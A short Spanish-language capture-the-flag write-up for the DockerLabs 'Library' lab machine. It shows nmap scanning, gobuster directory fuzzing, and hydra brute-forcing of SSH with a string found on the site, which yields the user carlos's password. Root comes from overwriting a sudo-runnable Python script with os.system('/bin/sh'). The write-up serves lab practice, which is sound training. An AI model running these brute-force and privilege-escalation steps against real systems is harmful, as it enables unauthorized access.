Maquina: Library
Dificultad: Facil
Objetivos:
Descripcion:


Se descarga la maquina vulnerable de la pagina de dockerlabs y se decomprime con unzip library.zip para poder desplegarlos con: sudo bash auto_deploy.sh library.tar


Para confirmar que tenemos conexion con la maquina vulnerable hacemos un ping -c1 172.17.0.3


Usamos sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt para averiguar puertos abiertos de la maquina, en este caso los puertos encontrados son el 80 http y el 22 ssh


Con nmap -sC -sV -p80,22 172.17.0.3 -oN target.txt buscamos mas informacion de los puertos abiertos como las versiones 


Al entrar http://172.17.0.3:80 encontre alojada la pagina default de apache2 y comence a buscar vulnerabilidades en la pagina sin exito


Comence a hacer fuzzing y se encontro 3 directorios ocultos: gobuster dir -u http://172.17.0.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt


Al entrar al directorio index.php se encontro unos caracteres: JIFGHDS87GYDFIGD


Se ralizo fuzzing a los directorios encontrados y encontre un nuevo resultado: gobuster dir -u http://172.17.0.3/javascript -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt


Y por ultimo realice fuzzin a este directorio encontrado gobuster dir -u http://172.17.0.3/javascript/jquery -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt 


Al terminar de invertigar los servicios web y no encontrar nada mas comence a hacer fuerza brura con hydra y usar JIFGHDS87GYDFIGD como una posible contraseña: hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.3 -t 4 
Y se encontro con las credenciales: [22][ssh] host: 172.17.0.3   login: carlos   password: JIFGHDS87GYDFIGD
Nota: Antes relice fuerza bruta con usuarios y contraseñas y el usuario root sin exito 



Ejecute el comando sudo -l y encontre que en /opt/ hay un script.py con privilegios asi que es script era una especie de copiar archivos borre el contidno y escribi:
import os

os.system("/bin/sh")
lo guarde y lo ejecute: /opt$ sudo /usr/bin/python3 /opt/script.py y pude tener una shell como root




